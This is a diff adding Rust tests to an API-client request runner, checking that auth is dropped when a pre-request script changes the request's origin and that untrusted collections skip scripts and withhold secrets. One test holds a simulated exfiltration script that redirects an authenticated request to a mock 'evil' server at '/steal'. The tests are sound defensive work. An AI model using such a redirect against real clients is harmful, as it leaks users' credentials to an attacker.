@@ -787,3 +787,88 @@ async fn enabled_headers_and_raw_body_are_resolved_and_sent() {
     assert!(got.headers.get("x-off").is_none());
     assert_eq!(got.body, br#"{"u":"me"}"#);
 }
+
+// ---- trust / auth origin binding
+
+fn auth_query() -> Value {
+    json!({"type": "api-key", "key": "k", "value": "v", "addTo": "query"})
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn origin_change_by_script_drops_auth_in_the_runner() {
+    let (good, evil) = (server().await, server().await);
+    let script = format!("nx.request.url = '{}/steal';", evil.uri());
+    let summary = run(config(
+        vec![req(
+            "r1",
+            &format!("{}/a", good.uri()),
+            json!({"auth": auth_query(), "preRequestScript": script}),
+        )],
+        json!({}),
+    ))
+    .await;
+    let reqs = evil.received_requests().await.unwrap();
+    assert_eq!(reqs.len(), 1);
+    assert_eq!(reqs[0].url.query(), None);
+    assert!(summary.results[0]
+        .script_logs
+        .iter()
+        .any(|l| l.args[0].as_str().unwrap().contains("Auth not sent")));
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn same_origin_keeps_auth_in_the_runner() {
+    let good = server().await;
+    let script = format!("nx.request.url = '{}/b';", good.uri());
+    run(config(
+        vec![req(
+            "r1",
+            &format!("{}/a", good.uri()),
+            json!({"auth": auth_query(), "preRequestScript": script}),
+        )],
+        json!({}),
+    ))
+    .await;
+    let reqs = good.received_requests().await.unwrap();
+    assert_eq!(reqs[0].url.path(), "/b");
+    assert_eq!(reqs[0].url.query(), Some("k=v"));
+}
+
+fn trust_config(s: &MockServer, untrusted: bool) -> RunConfig {
+    config(
+        vec![req(
+            "r1",
+            &format!("{}/a", s.uri()),
+            json!({
+                "headers": [{"key": "X-Tok", "value": "{{tok}}", "enabled": true}],
+                "preRequestScript": "nx.request.headers['X-Script'] = 'ran';",
+                "postResponseScript": "nx.test('t', () => {});",
+            }),
+        )],
+        json!({
+            "untrusted": untrusted,
+            "environmentVars": [{"key": "tok", "value": "S3CRET", "type": "secret", "enabled": true}],
+            "collectionExtra": {"preRequestScript": "nx.request.headers['X-Coll'] = 'ran';"},
+        }),
+    )
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn untrusted_collection_skips_scripts_and_withholds_secrets_in_the_runner() {
+    let s = server().await;
+    let summary = run(trust_config(&s, true)).await;
+    let r = &s.received_requests().await.unwrap()[0];
+    assert_eq!(r.headers.get("x-tok").unwrap().to_str().unwrap(), "{{tok}}");
+    assert!(r.headers.get("x-script").is_none() && r.headers.get("x-coll").is_none());
+    assert!(summary.results[0].test_results.is_empty());
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn trusted_collection_runs_scripts_and_resolves_secrets_in_the_runner() {
+    let s = server().await;
+    let summary = run(trust_config(&s, false)).await;
+    let r = &s.received_requests().await.unwrap()[0];
+    assert_eq!(r.headers.get("x-tok").unwrap().to_str().unwrap(), "S3CRET");
+    assert!(r.headers.get("x-script").is_some() && r.headers.get("x-coll").is_some());
+    assert_eq!(summary.results[0].test_results.len(), 1);
+}
